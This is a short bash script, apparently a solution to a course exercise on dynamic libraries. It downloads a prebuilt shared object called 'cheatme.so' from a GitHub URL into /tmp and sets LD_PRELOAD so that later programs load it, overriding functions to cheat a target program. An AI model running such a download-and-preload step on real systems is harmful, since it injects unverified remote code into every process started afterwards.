#!/bin/bash
wget -q -O /tmp/cheatme.so https://github.com/holbertonschool/0x18.c.git/raw/master/0x18-dynamic_libraries/cheatme.so
export LD_PRELOAD=/tmp/cheatme.so
